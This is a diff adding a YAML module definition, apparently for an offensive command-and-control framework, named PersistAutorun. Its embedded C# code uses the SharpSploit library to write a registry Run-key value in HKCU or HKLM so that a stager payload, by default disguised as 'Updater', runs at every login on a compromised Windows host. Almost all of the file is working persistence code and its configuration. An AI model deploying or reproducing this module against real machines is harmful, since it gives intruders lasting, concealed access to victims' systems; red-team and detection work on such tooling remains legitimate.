@@ -1,0 +1,145 @@
+name: PersistAutorun
+authors:
+  - name: Anthony Rose
+    handle: Cx01N
+    link: https://twitter.com/Cx01N_
+description: |
+  Installs an autorun value in HKCU or HKLM to execute a payload. Once
+  the key has been installed, the compromised host will execute the designated
+  program upon login. TargetHive specifies whether to modify the userland registry
+  key or elevated Machine key.
+software: ''
+tactics: [TA0003]
+techniques: [T1547.001]
+background: false
+output_extension: ''
+needs_admin: false
+opsec_safe: true
+language: csharp
+min_language_version: ''
+options:
+  - name: TargetHive
+    description: Target hive to install autorun.
+    required: true
+    value: CurrentUser
+    strict: true
+    suggested_values: [CurrentUser, LocalMachine]
+  - name: Name
+    description: Name for the registry value.
+    required: true
+    value: Updater
+    strict: false
+    suggested_values: []
+  - name: Value
+    description: Value to set in the registry.
+    required: true
+    value: C:\Example\GruntStager.exe
+    strict: false
+    suggested_values: []
+csharp:
+  UnsafeCompile: false
+  CompatibleDotNetVersions:
+    - Net35
+    - Net40
+  Code: |
+    using System;
+    using System.IO;
+    using SharpSploit.Persistence;
+
+    public static class Program
+    {
+        public static void Main(string[] args)
+        {
+            string targetHive = args.Length > 0 ? args[0] : "";
+            string name = args.Length > 1 ? args[1] : "";
+            string value = args.Length > 2 ? args[2] : "";
+
+            string result = InstallAutorunPersistence(targetHive, name, value);
+            Console.WriteLine(result);
+        }
+
+        public static string InstallAutorunPersistence(string targetHive, string name, string value = "")
+        {
+            using (StringWriter stringWriter = new StringWriter())
+            {
+                try
+                {
+                    if (targetHive.ToLower() != "hkey_current_user" && targetHive.ToLower() != "hkcu" &&
+                        targetHive.ToLower() != "currentuser" && targetHive.ToLower() != "hkey_local_machine" &&
+                        targetHive.ToLower() != "hklm" && targetHive.ToLower() != "localmachine")
+                    {
+                        return "Autorun Persistence failed. Invalid Target Hive specified.";
+                    }
+
+                    if (Autorun.InstallAutorun(targetHive, value, name))
+                    {
+                        stringWriter.WriteLine("Startup Persistence succeeded for: " + name);
+                    }
+                    else
+                    {
+                        stringWriter.WriteLine("Startup Persistence failed for: " + name);
+                    }
+                }
+                catch (Exception e)
+                {
+                    stringWriter.WriteLine(e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace);
+                }
+
+                return stringWriter.ToString();
+            }
+        }
+    }
+  ReferenceSourceLibraries:
+    - Name: SharpSploit
+      Description: SharpSploit is a library for C# post-exploitation modules.
+      Location: SharpSploit\SharpSploit\
+      Language: CSharp
+      CompatibleDotNetVersions:
+        - Net35
+        - Net40
+      ReferenceAssemblies:
+        - Name: System.Management.Automation.dll
+          Location: net35\System.Management.Automation.dll
+          DotNetVersion: Net35
+        - Name: System.Management.dll
+          Location: net40\System.Management.dll
+          DotNetVersion: Net40
+        - Name: System.Management.Automation.dll
+          Location: net40\System.Management.Automation.dll
+          DotNetVersion: Net40
+        - Name: System.IdentityModel.dll
+          Location: net40\System.IdentityModel.dll
+          DotNetVersion: Net40
+        - Name: System.dll
+          Location: net40\System.dll
+          DotNetVersion: Net40
+        - Name: System.DirectoryServices.dll
+          Location: net40\System.DirectoryServices.dll
+          DotNetVersion: Net40
+        - Name: System.Core.dll
+          Location: net40\System.Core.dll
+          DotNetVersion: Net40
+        - Name: mscorlib.dll
+          Location: net40\mscorlib.dll
+          DotNetVersion: Net40
+        - Name: System.Management.dll
+          Location: net35\System.Management.dll
+          DotNetVersion: Net35
+        - Name: mscorlib.dll
+          Location: net35\mscorlib.dll
+          DotNetVersion: Net35
+        - Name: System.Core.dll
+          Location: net35\System.Core.dll
+          DotNetVersion: Net35
+        - Name: System.DirectoryServices.dll
+          Location: net35\System.DirectoryServices.dll
+          DotNetVersion: Net35
+        - Name: System.dll
+          Location: net35\System.dll
+          DotNetVersion: Net35
+        - Name: System.IdentityModel.dll
+          Location: net35\System.IdentityModel.dll
+          DotNetVersion: Net35
+      EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
